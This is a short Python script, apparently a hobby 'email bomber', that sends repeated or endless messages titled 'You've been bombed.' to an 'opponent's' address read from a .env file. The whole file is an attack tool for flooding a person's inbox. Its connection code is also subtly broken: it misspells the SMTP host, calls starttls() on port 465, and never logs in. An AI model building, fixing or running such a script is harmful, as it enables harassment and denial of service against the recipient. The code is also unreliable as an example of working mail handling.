import smtplib
import sys
import os
from dotenv import load_dotenv
from email.mime.text import MIMEText


def bomber():
    SRC_EMAIL = os.getenv("SRC_EMAIL")
    DEST_EMAIL = os.getenv("DEST_EMAIL")

    smtp_obj = smtplib.SMTP("smpt.mail.ru", 465)
    msg = MIMEText("(✖╭╮✖)")
    smtp_obj.starttls()

    msg['Subject'] = "You've been bombed."
    msg['From'] = SRC_EMAIL
    msg['To'] = DEST_EMAIL

    smtp_obj.sendmail(SRC_EMAIL, DEST_EMAIL, msg.as_string())
    smtp_obj.close()


if __name__ == '__main__':
    dotenv_path = os.path.join(os.path.dirname(__file__), '.env')
    if os.path.exists(dotenv_path):
        load_dotenv(dotenv_path)
    arg = sys.argv[1]
    if arg == 'help':
        print("""
        Params: count of mails: 
        Infinite - server will send infinite mails to your opponents mail,
        some integer (n) - server will send exactly n-mails,  
        Type this parameter in your terminal after the 'python3 main'.
        """)
        sys.exit(0)
    elif arg == 'Infinite':
        while True:
            bomber()
    elif arg.isdigit():
        for _ in range(int(arg)):
            bomber()
    else:
        print("Enter the number!")
        sys.exit(0)
